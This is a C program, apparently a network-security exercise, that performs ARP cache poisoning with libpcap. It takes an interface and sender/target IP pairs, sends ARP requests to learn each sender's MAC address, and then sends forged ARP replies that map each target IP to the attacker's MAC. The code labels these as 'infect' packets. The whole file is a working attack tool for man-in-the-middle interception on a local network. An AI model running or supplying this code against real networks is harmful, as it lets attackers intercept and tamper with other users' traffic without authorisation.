#include <stdio.h>
#include <unistd.h>
#include <pcap.h>
#include <stdint.h>
#include <arpa/inet.h>
#include <time.h>
#include "arp_packet.h"

int main(int argc, char* argv[]) 
{
    if (argc % 2 != 0){
        usage();
        return -1;
    }

// 1. parameter handling
    uint8_t sender_ip[101][4];
    uint8_t target_ip[101][4];
    int sender_target_pair_num = 0;
    for(int i = 2; i < argc; i += 2){
        char * sender_ip_string = argv[i];
        char * target_ip_string = argv[i+1];
        ip_str_to_addr(sender_ip_string, sender_ip[sender_target_pair_num]);
        ip_str_to_addr(target_ip_string, target_ip[sender_target_pair_num]);
        sender_target_pair_num++;
    }
    char * dev = argv[1];
    uint8_t attacker_mac[6];
    uint8_t attacker_ip[4];
    get_attacker_mac_addr(attacker_mac);
    get_attacker_ip_addr(attacker_ip, dev);

// 2. get senders' mac addresses

        // arp request send packet
    arp_packet arp_packet_get_sender_mac_packet[101];
    for(int i = 0; i < sender_target_pair_num; i++){
        arp_packet_get_sender_mac_packet[i] = arp_request_get_sender_mac_addr(attacker_mac, sender_ip[i], target_ip[i], attacker_ip);
    }
    
        // arp response send and receive
    struct pcap_pkthdr* header;
    const u_char * packet;
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t * handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
        return -1;
    }
    clock_t t1, t2;
    bool check = true;
    uint8_t sender_mac[101][6];
    for(int now_pair = 0; now_pair < sender_target_pair_num; now_pair++){
        while (true) {
            if(!check){ // sent state
                t2 = clock();
                // last sent time - now >= RESEND_SEC (5 sec), arp request must be re-sent
                if ((t2 - t1) / CLOCKS_PER_SEC >= RESEND_SEC){
                    check = true;
                }
            }
            else{ // not sent state
                if(pcap_sendpacket(handle, (uint8_t *)(& arp_packet_get_sender_mac_packet[now_pair]), ARP_PACKET_LEN) != 0){
                    printf("[Error] packet sending is failed.\n");
                    return -1;
                }
                t1 = clock(); // last sent time
                check = false;
            }
            
            int res = pcap_next_ex(handle, &header, &packet);
            if (res == 0) continue;
            if (res == -1 || res == -2) break;

            // packet 분석해서 arp response 인 경우 break, 아니면 계속 반복
                // arp 인지 확인
            if(ntohs(*((uint16_t *)(packet + ETHERTYPE))) == Ethertype_ARP){ // ARP packet 확인
                if(ntohs(*((uint16_t *)(packet + ARP_OPCODE))) == ARP_operation_reply){ // ARP reply 확인
                    int start = ARP_DESTINATION_MAC_ADDR;
                    int end = start + MAC_address_length;
                    bool continue_detect = false;
                    for(int i = start; i < end; i++){
                        if(*(packet + i) != attacker_mac[i - start]){
                            continue_detect = true;
                            break;
                        }
                    }
                    if(continue_detect) continue;
                    copy_6byte((uint8_t *)packet + ARP_SOURCE_MAC_ADDR, sender_mac[now_pair]);
                    printf("[Success] pair %d 's Sender Mac Address: ", now_pair + 1);
                    print_6byte_mac(sender_mac[now_pair]); break;
                }
            }
        }
    }

    // 두 번째로 할 일 - sender 에게 [ip = target ip / mac = attacker mac] 인 arp response 전송
    arp_packet arp_packet_deceive_sender[101];
    for(int now_pair = 0; now_pair < sender_target_pair_num; now_pair++){
        arp_packet_deceive_sender[now_pair] = arp_reply_target_ip_with_attacker_mac(attacker_mac, sender_mac[now_pair], target_ip[now_pair], sender_ip[now_pair]);
    }
    for(int now_pair = 0; now_pair < sender_target_pair_num; now_pair++){
        if(pcap_sendpacket(handle, (uint8_t *)(& arp_packet_deceive_sender[now_pair]), ARP_PACKET_LEN) != 0){
            printf("[Error] packet sending is failed.\n");
            return -1;
        }
        else printf("[Success] pair %d 's Infect Packet Sent Successfully.\n", now_pair + 1);
    }

    return 0;
}
